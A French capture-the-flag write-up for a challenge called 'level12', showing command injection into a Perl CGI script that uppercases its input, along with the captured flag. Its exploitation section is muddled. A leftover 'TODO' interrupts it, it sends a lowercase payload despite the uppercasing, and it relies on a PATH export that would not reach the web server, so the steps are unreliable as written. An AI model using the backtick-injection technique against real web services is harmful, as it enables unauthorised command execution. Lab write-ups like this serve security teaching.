# level12

## Contexte

On trouve un script Perl `level12.pl`.

Le script est utilisé par un serveur web.

## Recherche

En lisant le code, on remarque qu'un paramètre de la requête HTTP est récupéré puis utilisé dans une commande.

Avant d'être exécutée, la chaîne est convertie en majuscules.

## Vulnérabilité

Même si la chaîne est modifiée, il est toujours possible d'injecter une commande grâce à la substitution de commande du shell.

Comme le script est exécuté avec les droits de `flag12`, notre commande le sera également.

## Exploitation

On crée un script contenant la commande à exécuter :

TODO

```bash
echo 'getflag > /tmp/flag' > /tmp/GETFLAG
chmod +x /tmp/GETFLAG
```

On ajoute `/tmp` au `PATH` :

```bash
export PATH=/tmp:$PATH
```

On envoie ensuite une requête contenant :

```text
`getflag`
```

(ou le nom du script créé, selon la méthode utilisée)

Le script exécute notre commande.

On récupère ensuite le résultat :

```bash
cat /tmp/flag
```

Résultat :

```text
g1qKMiRpXf53AWhDaU7FEkczr
```

## Ressources

- Perl
- CGI
- Injection de commande
- Variables d'environnement